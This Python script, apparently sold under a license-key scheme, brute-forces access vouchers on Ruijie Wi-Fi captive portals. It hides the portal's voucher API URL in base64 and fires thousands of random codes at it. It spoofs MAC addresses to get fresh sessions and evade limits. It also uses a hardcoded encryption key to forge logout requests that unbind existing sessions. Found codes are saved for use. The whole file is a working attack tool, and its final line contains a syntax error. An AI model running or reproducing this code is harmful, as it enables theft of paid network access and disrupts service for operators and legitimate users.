import random
import string
import os
import re
import sys
import zlib
import time
import base64
import urllib
import marshal
import getpass
import aiohttp
import asyncio
import hashlib
import argparse
import requests
import subprocess
import importlib.util
from datetime import timedelta, datetime
from urllib.parse import unquote

# WifiSetup အတွက် မရှိမဖြစ်လိုအပ်သော Crypto Libraries များ
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    from Crypto.Random import get_random_bytes
except ImportError:
    print("\033[1;31m[!] Error: pycryptodome library no found 'pip install pycryptodome' add\033[0m")
    sys.exit(1)

# --- Professional Color Palette (စာလုံးအကြီးများဖြင့် တစ်သမတ်တည်း သတ်မှတ်ချက်) ---
W = "\033[0m"        # White
G = "\033[1;32m"     # Bright Green
Y = "\033[1;33m"     # Bright Yellow
R = "\033[1;31m"     # Red
B = "\033[1;34m"     # Blue
C = "\033[1;36m"     # Cyan

DEFAULT_GATEWAY = "192.168.110.1"
RAW_KEY_LINK = "https://raw.githubusercontent.com/paingkhant2701199/New_vers/main/key.txt"
POST_URL = base64.b64decode(b"aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=").decode()

# =====================================================================
# GLOBAL VARIABLES & OPTIMIZED FILE LOADING (11.py မူရင်းစနစ်အတိုင်း)
# =====================================================================
__ALL__ = []
SUCCESS = 0
IN_RUNNING_BIN = set()  
MY = ""
LAST_RESPONSE_TIME = time.time()

def load_checked_codes(filename):
    try:
        with open(filename, "r", encoding="utf-8", buffering=1024 * 1024) as f:
            return {line.strip() for line in f if line.strip()}
    except FileNotFoundError:
        return set()

def write_file(filename, data):
    with open(filename, "a", encoding="utf-8") as f:
        f.write(data + "\n")

ascii_lower_bin6 = load_checked_codes("ascii_lower_bin6.txt")
ascii_lower_bin7 = load_checked_codes("ascii_lower_bin7.txt")
ascii_upper_bin6 = load_checked_codes("ascii_upper_bin6.txt")
ascii_upper_bin7 = load_checked_codes("ascii_upper_bin7.txt")
ascii_bin_mix6 = load_checked_codes("ascii_bin_mix6.txt")
ascii_bin_mix7 = load_checked_codes("ascii_bin_mix7.txt")

# =====================================================================
# HELPER FUNCTIONS & LOGO
# =====================================================================
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def Line():
    try: columns = os.get_terminal_size()[0]
    except OSError: columns = 80
    print(f"{Y}-\033[1;00m" * columns)

def Logo():
    clear()
    logo = rf"""{R}
 /$$$$$$$            /$$       /$$          
| $$__  $$          |__/      |__/          
| $$  \ $$ /$$  /$$  /$$ /$$   /$$  /$$$$$$ 
| $$$$$$$/| $$ | $$ | $$| $$  | $$ /$$__  $$
| $$__  $$| $$ | $$ | $$| $$  | $$| $$$$$$$$
| $$  \ $$| $$ | $$ | $$| $$  | $$| $$_____/
| $$  | $$|  $$$$$$$$/|  $$$$$$$/|  $$$$$$$
|__/  |__/ \________/  \____  $$  \_______/
                       /$$  | $$            
                      |  $$$$$$/            
                       \______/             
{W}Auto-Reconnect & Monitor System Integrated
{C}Telegram: {G}@paing07709
"""
    print(logo)
    Line()

# =====================================================================
# LICENSE & DEVICE ID SYSTEM (1st Code 100% ပုံစံတူ)
# =====================================================================
def get_device_id():
    id_file = ".ruijie_id"
    if os.path.exists(id_file): return open(id_file, "r").read().strip()
    try:
        serial = os.popen("getprop ro.serialno").read().strip()
        if not serial or len(serial) < 4:
            serial = "".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
        new_id = f"RUI-{serial[:10].upper()}"
        with open(id_file, "w") as f: f.write(new_id)
        return new_id
    except: return "RUI-UNKNOWN-ID"

def get_network_time():
    try:
        res = requests.get("https://www.google.com", timeout=5)
        gmt_str = res.headers.get('Date')
        gmt_dt = datetime.strptime(gmt_str, '%a, %d %b %Y %H:%M:%S %Z')
        mm_time = gmt_dt + timedelta(hours=6, minutes=30)
        return mm_time
    except: return None

def parse_duration(duration_str):
    days = re.search(r'(\d+)\s*(d|day)', duration_str, re.I)
    hours = re.search(r'(\d+)\s*(h|hour)', duration_str, re.I)
    minutes = re.search(r'(\d+)\s*(m|min)', duration_str, re.I)
    d = int(days.group(1)) if days else 0
    h = int(hours.group(1)) if hours else 0
    m = int(minutes.group(1)) if minutes else 0
    return timedelta(days=d, hours=h, minutes=m)

def format_countdown(expiry_dt, current_dt):
    diff = expiry_dt - current_dt
    if diff.total_seconds() <= 0: return "Expired"
    days = diff.days
    hours, rem = divmod(diff.seconds, 3600)
    minutes, seconds = divmod(rem, 60)
    return f"{days}D, {hours}H, {minutes}M, {seconds}S"

def check_online_license(user_key):
    dev_id = get_device_id()
    key_file = ".access_key"
    last_time_file = ".last_seen"
    net_time = get_network_time()
    curr_sys_time = datetime.now()
    
    if os.path.exists(last_time_file):
        try:
            last_ts = float(open(last_time_file, "r").read().strip())
            if curr_sys_time.timestamp() < last_ts:
                return False, "Time Travel Detected! Fix your date."
        except: pass
    
    current_working_time = net_time if net_time else curr_sys_time
    with open(last_time_file, "w") as f: f.write(str(current_working_time.timestamp()))

    try:
        res = requests.get(RAW_KEY_LINK, timeout=10)
        if res.status_code == 200:
            lines = res.text.splitlines()
            for line in lines:
                if "|" in line:
                    parts = [p.strip() for p in line.split("|")]
                    if parts[0] == dev_id and parts[1] == user_key:
                        raw_duration = parts[2]
                        if os.path.exists(key_file):
                            saved_data = open(key_file, "r").read().strip().split("|")
                            expiry_dt = datetime.fromtimestamp(float(saved_data[1]))
                        else:
                            if not net_time: return None, "Activation requires internet!"
                            delta = parse_duration(raw_duration)
                            expiry_dt = net_time + delta
                            with open(key_file, "w") as f: f.write(f"{user_key}|{expiry_dt.timestamp()}")
                        
                        if current_working_time < expiry_dt: return True, expiry_dt
                        else: return False, "Key Expired!"
            return False, "Key not found on Server!"
    except:
        if os.path.exists(key_file):
            try:
                s_key, s_exp_ts = open(key_file, "r").read().strip().split("|")
                expiry_dt = datetime.fromtimestamp(float(s_exp_ts))
                if curr_sys_time < expiry_dt: return True, expiry_dt
            except: pass
        return None, "Connection Error!"
    return False, "Access Denied"

def license_screen():
    dev_id = get_device_id()
    key_file = ".access_key"
    while True:
        Logo()
        print(f"{W}[>] Device ID: {Y}{dev_id}{W}")
        saved_key = ""
        if os.path.exists(key_file):
            try: saved_key = open(key_file, "r").read().strip().split("|")[0]
            except: pass
        user_key = saved_key if saved_key else input(f"{W}[?] Enter Access Key: {G}")
        status, info = check_online_license(user_key)
        if status is True:
            remaining = format_countdown(info, datetime.now())
            print(f"{G}[+] Access Granted!{W}")
            print(f"{Y}[!] Remaining: {remaining}{W}")
            time.sleep(2); return info
        elif status is False:
            if os.path.exists(key_file): os.remove(key_file)
            print(f"{R}[!] {info}{W}"); sys.exit()
        else:
            print(f"{Y}[!] {info}{W}")
            if not saved_key: input(f"\n{G}Press Enter to retry...{W}")
            else: time.sleep(2); return None

# =====================================================================
# HIGH-SPEED GENERATORS (11.py 100% ပုံစံတူ မပြောင်းလဲပါ)
# =====================================================================
def all_generator(digit_length, ascii_length, digit_length_type, ascii_length_type, length, arrange):
    pair_options = {6: [(1, 5), (2, 4), (3, 3), (4, 2)], 7: [(1, 6), (2, 5), (3, 4), (4, 3)], 8: [(1, 7), (2, 6), (3, 5), (4, 4)]}
    while True:
        if digit_length_type == str and ascii_length_type == str:
            pairs = pair_options.get(length, [(1, length - 1)])
            pair = random.choice(pairs)
            dgt = "".join(random.choices(string.digits, k=pair[0]))
            aci = "".join(random.choices(string.ascii_lowercase, k=pair[1]))
            if arrange == "da": voucher = dgt + aci
            elif arrange == "ad": voucher = aci + dgt
            elif arrange == "random": voucher = "".join(random.choices(string.digits + string.ascii_lowercase, k=length))
            elif arrange == "ada":
                laci = list(aci)
                for i in dgt: laci.insert(random.randint(1, len(laci) - 1), i)
                voucher = "".join(laci)
        else:
            dgt = "".join(random.choices(string.digits, k=digit_length))
            aci = "".join(random.choices(string.ascii_lowercase, k=ascii_length))
            if arrange == "da": voucher = dgt + aci
            elif arrange == "ad": voucher = aci + dgt
            elif arrange == "random":
                combine = list(dgt + aci)
                random.shuffle(combine)
                voucher = "".join(combine)
            elif arrange == "ada":
                laci = list(aci)
                for i in dgt: laci.insert(random.randint(1, len(laci) - 1), i)
                voucher = "".join(laci)
        if voucher not in IN_RUNNING_BIN: return voucher

def ascii_generator(mode, length):
    if mode == "ascii-lower": chars, checked_bin = string.ascii_lowercase, ascii_lower_bin6 if length == 6 else (ascii_lower_bin7 if length == 7 else set())
    elif mode == "ascii-upper": chars, checked_bin = string.ascii_uppercase, ascii_upper_bin6 if length == 6 else (ascii_upper_bin7 if length == 7 else set())
    elif mode == "ascii-mix": chars, checked_bin = string.ascii_uppercase + string.ascii_lowercase, ascii_bin_mix6 if length == 6 else (ascii_bin_mix7 if length == 7 else set())
    else: chars, checked_bin = string.ascii_lowercase, set()
    while True:
        voucher = "".join(random.choices(chars, k=length))
        if voucher not in checked_bin and voucher not in IN_RUNNING_BIN: return voucher

def digit_generator(length):
    while True:
        voucher = "".join(random.choices(string.digits, k=length))
        if voucher not in IN_RUNNING_BIN: return voucher

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'mac=[^&]*', f'mac={new_mac}', url)

async def get_session_id(session, session_url, previous_session_id, rep_mac=True):
    if rep_mac:
        mac = get_mac()
        session_url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': session_url,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True, timeout=5) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id: return session_id.group(1)
            return False
    except:
        return previous_session_id

# =====================================================================
# WIFIO SETUP CLASS (11.py 100% ပုံစံတူ မပြောင်းလဲပါ)
# =====================================================================
class WifiSetup:
    def __init__(self):
        self.baseurl = "http://10.44.77.240:2060"
        self.username_get_url = self.baseurl + "/username_get"
        self.online_info_url = self.baseurl + "/user/online_info"
        self.logout_url = self.baseurl + "/user/logout"
        self.enc_key = "RjYkhwzx$2018!" 

    def start_setup(self, auto_mode=False):
        print("[*] Ruijie Wi-Fi Setup go ")
        status = self.unbind()
        print("-" * 50)
        if not status:
            print("wifi Error")
            if auto_mode: return False
        else:
            print("Successful")
            print("Waiting 6 Seconds")
            time.sleep(6)
        print("-" * 50)

        print("[*] Router From Data")
        try:
            localhost = requests.get("http://192.168.0.1", timeout=10).url
            ip = re.search('gw_address=(.*?)&', localhost).group(1)
            
            headers = {
                'authority': 'portal-as.ruijienetworks.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'referer': localhost,
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            }
            
            req = requests.get(localhost, headers=headers).text
            path = re.search("href='(.*?)'</script>", req).group(1)
            session_url = "https://portal-as.ruijienetworks.com" + path
            
            with open(".session_url", "w") as f:
                f.write(session_url)
            with open(".ip", "w") as f:
                f.write(ip)
                
            print("-" * 50)
            print(f"[Success] Setup Successful")
            print(f"Save IP: {ip}")
            print(f"[+] Save Session URL:\n{session_url}")
            print("-" * 50)
            return True
            
        except Exception as err:
            print(f"[!] Error: Setup {err}")
            return False

    def unbind(self):
        username = self.username_get()
        if not username:
            return False
        online_info = self.get_online_info(username)
        if not online_info:
            return False
        data = self.arrange_data(online_info)
        return self.logout(data, username)

    def username_get(self):
        try:
            req = requests.get(self.username_get_url, timeout=5).json()
            return req.get("username", None)
        except:
            return None
    
    def get_online_info(self, username):
        params = {"username": username, "usertype": "wifidog"}
        try:
            req = requests.get(self.online_info_url, params=params, timeout=5).json()
            return req["data"]["list"][0]
        except:
            return None

    def arrange_data(self, info):
        repmac = info["mac"].replace(":", "")
        repmac = [repmac[i:i+4] for i in range(0, len(repmac), 4)]
        mac_req = ".".join(repmac)
        return {
            "ip": info["ip"],
            "mac": info["mac"],
            "ip_req": info["ip"],
            "mac_req": mac_req
        }

    def get_data(self):
        try:
            return requests.get(self.baseurl, timeout=5).text
        except:
            return None

    def extract_chap(self, data):
        match = re.search(r"chap_id=([^&]+)&chap_challenge=([^']+)", data)
        if not match:
            return None
        return {"chap_id": match.group(1), "chap_challenge": match.group(2)}
    
    def encrypt_cryptojs(self, auth, enc_key):
        salt = get_random_bytes(8)
        key_iv = b''
        prev = b''
        while len(key_iv) < 48:
            prev = hashlib.md5(prev + enc_key.encode("utf-8") + salt).digest()
            key_iv += prev
        key = key_iv[:32]
        iv = key_iv[32:48]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        padded_data = pad(auth.encode("utf-8"), AES.block_size)
        cipher_text = cipher.encrypt(padded_data)
        encrypted_data = b"Salted__" + salt + cipher_text
        return base64.b64encode(encrypted_data).decode("utf-8")

    def get_auth(self, username):
        data = self.get_data()
        if not data:
            print("Error")
            return None
        chaps = self.extract_chap(data)
        if not chaps:
            print("Error")
            return None
        chap_id_decoded = urllib.parse.unquote(chaps["chap_id"])
        chap_challenge_decoded = urllib.parse.unquote(chaps["chap_challenge"])
        auth = chap_id_decoded + chap_challenge_decoded + username
        return self.encrypt_cryptojs(auth, self.enc_key)

    def logout(self, data, username):
        auth = self.get_auth(username)
        if not auth:
            return False
        payload = f"ip={data['ip']}&mac={data['mac']}&ip_req={data['ip_req']}&mac_req={data['mac_req']}&auth={auth}"
        try:
            respond = requests.post(self.logout_url, data=payload, timeout=5).json()
            return bool(respond.get("success"))
        except:
            return False

# =====================================================================
# BRUTEFORCE CLASS (11.py 100% ပုံစံတူ မပြောင်းလဲပါ)
# =====================================================================
class VoucherCode:
    def __init__(self, mode=None, length=None, speed=None, tasks=None, debug=False, digit_length=None, ascii_length=None, digit_length_type=None, ascii_length_type=None, arrange=None, expiry_dt=None):
        self.mode = mode
        self.length = length
        self.speed = speed  
        self.tasks = tasks  
        self.debug = debug
        self.digit_length = digit_length
        self.ascii_length = ascii_length
        self.digit_length_type = digit_length_type
        self.ascii_length_type = ascii_length_type
        self.arrange = arrange
        self.expiry_dt = expiry_dt
        self.file = f"failed_{self.mode}{self.length}.txt" if self.length != 8 else None

        self.load_session()
        self.checked_history = set()
        if self.file:
            try:
                with open(self.file, "r", encoding="utf-8") as f: self.checked_history.update(f.read().splitlines())
            except FileNotFoundError: pass
        self.neglected_count = len(self.checked_history)

    def load_session(self):
        try: self.session_url = open(".session_url", "r").read().strip()
        except FileNotFoundError: self.session_url = ""

    async def worker(self, queue, session):
        global IN_RUNNING_BIN
        loop_count = 0
        session_id = await get_session_id(session, self.session_url, None, rep_mac=True)

        while True:
            voucher = await queue.get()
            try:
                if loop_count % 120 == 0 and loop_count > 0: 
                    session_id = await get_session_id(session, self.session_url, None, rep_mac=True)
                await login_voucher(session, session_id, voucher, file=self.file, debug=self.debug)
                loop_count += 1
            finally:
                queue.task_done()

    async def monitor_stuck(self, workers):
        global LAST_RESPONSE_TIME
        while True:
            await asyncio.sleep(5)
            if time.time() - LAST_RESPONSE_TIME > 15: 
                print(f"\n\033[1;33m[!] Auto connection\033[0m")
                setup_obj = WifiSetup()
                if setup_obj.start_setup(auto_mode=True):
                    self.load_session()
                    print(f"\033[1;32m[+] Reset Successful\033[0m")
                    LAST_RESPONSE_TIME = time.time() 
                else:
                    print(f"\033[1;31m[!] Wi-Fi Contact Waiting 5 Second\033[0m")

    async def start_pool(self, generator_func):
        global IN_RUNNING_BIN, LAST_RESPONSE_TIME
        connector = aiohttp.TCPConnector(limit=self.speed, limit_per_host=0, ttl_dns_cache=600)
        timeout = aiohttp.ClientTimeout(total=5) 
        LAST_RESPONSE_TIME = time.time()

        print(f"[*] High-Speed Auto-Monitor Mode: {self.mode}")
        print(f"\033[1;33m[+] Neglected: {self.neglected_count}\033[0m")
        queue = asyncio.Queue(maxsize=self.tasks * 2)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            workers = [asyncio.create_task(self.worker(queue, session)) for _ in range(self.tasks)]
            monitor_task = asyncio.create_task(self.monitor_stuck(workers))

            try:
                while True:
                    # Key သက်တမ်း ကုန်/မကုန် တစ်ခါတည်း စစ်ဆေးခြင်း
                    if self.expiry_dt:
                        remaining = format_countdown(self.expiry_dt, datetime.now())
                        if remaining == "Expired":
                            print(f"\n{R}[!] License Key Expired!{W}")
                            sys.exit()
                            
                    voucher = generator_func()
                    if voucher not in self.checked_history and voucher not in IN_RUNNING_BIN:
                        IN_RUNNING_BIN.add(voucher)
                        await queue.put(voucher)
                    if queue.qsize() > self.tasks:
                        await asyncio.sleep(0.1) 
            except KeyboardInterrupt: pass
            finally:
                monitor_task.cancel()
                for w in workers: w.cancel()

    async def execute_all(self): await self.start_pool(lambda: all_generator(self.digit_length, self.ascii_length, self.digit_length_type, self.ascii_length_type, self.length, self.arrange))
    async def execute_ascii(self): await self.start_pool(lambda: ascii_generator(self.mode, self.length))
    async def execute_digit(self): await self.start_pool(lambda: digit_generator(self.length))

# =====================================================================
# API REQUEST & RESPONSE HANDLING
# =====================================================================
async def login_voucher(session, session_id, voucher, file=None, check=False, debug=False):
    global SUCCESS, LAST_RESPONSE_TIME
    if not session_id: return

    data = {"accessCode": voucher, "sessionId": session_id, "apiVersion": 1}
    headers = {
        "authority": "portal-as.ruijienetworks.com", "accept": "*/*", "content-type": "application/json",
        "origin": "https://portal-as.ruijienetworks.com",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    }

    try:
        async with session.post(POST_URL, json=data, headers=headers, ssl=False) as req:
            response = await req.text()
            LAST_RESPONSE_TIME = time.time() 
    except Exception:
        if voucher in IN_RUNNING_BIN: IN_RUNNING_BIN.remove(voucher)
        return

    if "logonUrl" in response:
        SUCCESS += 1
        print(f"\n\033[1;32m[+] SUCCESS VOUCHER FOUND: {voucher}\033[0m\n")
        write_file("success.txt", voucher)
    elif "expired" in response or "failed" in response or "STA" in response:
        if file: write_file(file, voucher)
        sys.stdout.write("•")
        sys.stdout.flush()
            
    if voucher in IN_RUNNING_BIN: IN_RUNNING_BIN.remove(voucher)

# =====================================================================
# MAIN HUB INTERFACE (Error ရှင်းလင်းပြီးသားဗားရှင်း)
# =====================================================================
def feature(expiry_dt):
    while True:
        Logo()
        if expiry_dt:
            remaining = format_countdown(expiry_dt, datetime.now())
            print(f"{C}[ Access Key Expires in: {remaining} ]{W}\n")
            
        print(f"{G}[*] Select an option:")
        print(f"{C}1. {W}Code (Bruteforce + Auto Restart)")
        print(f"{C}2. {W}Setup (Wi-Fi)")
        print(f"{R}0. {W}Exit")
        
        choice = input(f"\n{C}Enter choice: {W}").strip()
        if choice == "2":
            WifiSetup().start_setup()
            time.sleep(2)
        elif choice == "1":
            # အက္ခရာအသေး c နေရာမှာ အကြီး C သို့ ပြောင်းလဲပြင်ဆင်ပြီး
            mode = input(f"{C}Enter mode (digit, ascii-lower, ascii-upper, all) [default: digit]: {W}").strip() or "digit"
            speed = int(input(f"{C}Enter speed [default: 80]: {W}") or 80)
            tasks = int(input(f"{C}Enter tasks [default: 80]: {W}") or 80)
            
            digit_length, ascii_length = 0, 0
            arrange = "random"

            if mode == "digit":
                digit_length = int(input(f"{C}Enter digit length (6, 7, 8) [default: 6]: {W}") or 6)
                length = digit_length
                brute = VoucherCode(mode=mode, length=length, speed=speed, tasks=tasks, expiry_dt=expiry_dt)
                asyncio.run(brute.execute_digit())
                
            elif mode in ["ascii-lower", "ascii-upper"]:
                length = int(input(f"{C}Enter length (6, 7) [default: 6]: {W}") or 6)
                brute = VoucherCode(mode=mode, length=length, speed=speed, tasks=tasks, expiry_dt=expiry_dt)
                asyncio.run(brute.execute_ascii())
                
            elif mode == "all":
                length = int(input(f"{C}Enter total length (6, 7, 8) [default: 6]: {W}") or 6)
                print(f"{G}[*] Arrange Option: da (Digit+Ascii), ad (Ascii+Digit), ada, random")
                arrange = input(f"{C}Enter arrange [default: random]: {W}").strip() or "random"
                brute = VoucherCode(mode=mode, length=length, speed=speed, tasks=tasks, digit_length_type=str, ascii_length_type=str, arrange=arrange, expiry_dt=expiry_dt)
                asyncio.run(brute.execute_all())
        elif choice == "0":
            break

if __name__ == "__main__" 
    expiry_info = license_screen()
    if expiry_info:
        feature(expiry_info)
        
      
